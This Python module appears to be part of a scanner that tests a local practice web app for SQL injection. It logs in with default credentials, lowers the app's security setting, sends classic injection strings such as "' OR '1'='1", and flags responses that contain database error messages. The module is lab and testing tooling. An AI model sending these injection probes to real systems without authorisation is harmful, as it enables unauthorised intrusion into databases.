import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

def run(url, results):
    print('\nSQLI')
    session = requests.Session()
    r = session.get("http://localhost/login.php")
    soup = BeautifulSoup(r.text, "html.parser")
    token_input = soup.find("input", {"name": "user_token"})
    user_token = token_input.get("value")
    session.post("http://localhost/login.php",data={
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": user_token
    })
    
    r = session.get("http://localhost/security.php")
    soup = BeautifulSoup(r.text, "html.parser")
    token_input = soup.find("input", {"name": "user_token"})
    security_token = token_input.get("value")
    session.post("http://localhost/security.php", data={
        "security": "low",
        "seclev_submit": "Submit",
        "user_token": security_token
    })

    payloads = [
        "'",
        '"',
        "' OR '1'='1",
        "1' OR '1'='1"
    ]

    errors = [
        'SQL syntax',
        'mysql_fetch',
        'ORA-01756',
        'PostgreSQL',
        'SQLite3::'
    ]
    sqli_results = {}
    
    for payload in payloads:
        r = session.get(url, params={
            "id": payload,
            "Submit": "Submit"
        })
        found = False
        for error in errors:
            if error in r.text:
                found = True
                break
        if found:
            sqli_results[payload] = 'vulnerable'
            print(Fore.RED + f"[VULNERABLE] {payload}" + Style.RESET_ALL)
        else:
            sqli_results[payload] = 'safe'
            print(Fore.GREEN + f"[SAFE] {payload}" + Style.RESET_ALL)

    results["SQLI"] = sqli_results